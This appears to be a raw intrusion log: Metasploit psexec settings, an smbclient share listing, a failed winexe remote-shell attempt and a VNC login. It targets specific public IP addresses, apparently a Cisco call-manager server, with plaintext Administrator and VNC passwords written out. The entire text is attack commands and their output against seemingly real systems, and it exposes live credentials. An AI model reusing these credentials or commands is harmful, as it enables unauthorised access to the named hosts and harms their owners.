```
msf6 exploit(windows/smb/psexec) > setg rhost 148.217.196.11
rhost => 148.217.196.11
msf6 exploit(windows/smb/psexec) > setg smbuser Administrator
smbuser => Administrator
msf6 exploit(windows/smb/psexec) > setg smbpass x1kt0r1@_u4z
smbpass => x1kt0r1@_u4z
msf6 exploit(windows/smb/psexec) >
```


```

smbclient -L 148.217.240.11 -U Administrator%x1kt0r1@_u4z
        Sharename       Type      Comment
        ---------       ----      -------
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        D$              Disk      Default share
        CDR             Disk
        RTMTLogs        Disk
        TFTPPath        Disk
        ADMIN$          Disk      Remote Admin
        H$              Disk
        C$              Disk      Default share
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
```

```
winexe -U Administrador%x1kt0r1@_u4z //148.217.240.11 cmd.exe
cli_credentials_failed_kerberos_login: krb5_cc_get_principal failed: No such file or directory
ERROR: Failed to open connection - NT_STATUS_LOGON_FAILURE
```


```
VNC CM Zac	c4llm4n4ger
```